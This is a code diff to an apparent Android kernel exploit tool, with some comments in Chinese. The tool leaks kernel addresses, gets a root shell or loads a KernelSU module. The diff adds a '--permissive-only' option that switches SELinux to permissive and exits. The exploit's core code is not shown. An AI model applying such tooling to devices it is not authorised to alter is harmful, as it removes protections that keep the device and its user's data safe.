@@ -596,6 +596,7 @@ static char g_module_path[256] = "/data/local/tmp/kernelsu.ko";
 static int g_leak_only;
 static int g_shell_mode;
 static int g_force_release;
+static int g_permissive_only;
 
 
 /* ---------- 释放内嵌的 kernelsu.ko ---------- */
@@ -698,6 +699,7 @@ static void usage(const char *prog) {
           "Special:\n"
           "  -s, --shell         Root shell only (do NOT load KernelSU)\n"
           "  -f, --force         Overwrite existing released files\n"
+          "  -p, --permissive-only  Only set SELinux permissive (no KSU, no shell)\n"
           "  --leak-only         Only run the KASLR/leak verification (no writes)\n"
           "  --leak-y-only       Only verify the Y task leak (no exploitation)\n",
           prog);
@@ -725,6 +727,8 @@ int main(int argc, char **argv) {
       g_shell_mode = 1;
     } else if (strcmp(argv[i], "-f") == 0 || strcmp(argv[i], "--force") == 0) {
       g_force_release = 1;
+    } else if (strcmp(argv[i], "-p") == 0 || strcmp(argv[i], "--permissive-only") == 0) {
+      g_permissive_only = 1;
     } else if (strcmp(argv[i], "--leak-only") == 0) {
       g_leak_only = 1;
     } else if (strcmp(argv[i], "--leak-y-only") == 0) {
@@ -736,8 +740,14 @@ int main(int argc, char **argv) {
     }
   }
 
+  if (g_shell_mode && g_permissive_only) {
+    pr_warning("-s/--shell and -p/--permissive-only are mutually exclusive\n");
+    usage(argv[0]);
+    return 2;
+  }
+
   /* 参数校验失败时只打印帮助、不执行 exploit */
-  if (!g_shell_mode && module_given && access(g_module_path, F_OK) != 0) {
+  if (!g_shell_mode && !g_permissive_only && module_given && access(g_module_path, F_OK) != 0) {
     pr_warning("module file not found: %s\n", g_module_path);
     usage(argv[0]);
     return 2;
@@ -856,6 +866,8 @@ int main(int argc, char **argv) {
         __asm__ volatile("yield" ::: "memory");
       }
     }
+
+    if (g_permissive_only) _exit(0);
 
     /* 身份 + SELinux 域：带 [CHILD] 前缀输出（同 CapPrm 风格） */
     pr_success("[CHILD] ");
@@ -981,6 +993,12 @@ int main(int argc, char **argv) {
   if (wp < 0 && errno != ECHILD) {
       pr_warning("[PARENT] waitpid(%d) failed: %s\n",
                  (int)child_pid, strerror(errno));
+  } else if (wp == child_pid && g_permissive_only) {
+      if (WIFEXITED(cstatus) && WEXITSTATUS(cstatus) == 0) {
+          pr_success("[KSU] SELinux is permissive now (permissive-only mode)\n");
+      } else {
+          pr_warning("[KSU] permissive-only failed (status=0x%x)\n", cstatus);
+      }
   } else if (!g_shell_mode && wp == child_pid) {
       int load_failed = 0;
       if (status_pipe[0] >= 0) {
